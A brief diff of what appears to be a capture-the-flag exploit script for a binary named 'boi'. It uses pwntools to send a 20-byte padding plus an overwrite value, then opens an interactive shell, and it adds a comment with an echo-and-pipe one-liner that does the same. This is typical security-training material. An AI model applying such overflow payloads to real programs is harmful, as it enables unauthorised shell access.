@@ -9,3 +9,6 @@ payload = b'A' * 20 + p32(0xcaf3baee)   # b'A' is necessary, because pwn used by
 p.send(payload)
 
 p.interactive()  # Takes over stdin/stdout for shell interaction
+
+# another way to solve, without pwntools, is:
+# (echo -ne "AAAAAAAAAAAAAAAAAAAA\xee\xba\xf3\xca"; cat -) | ./boi
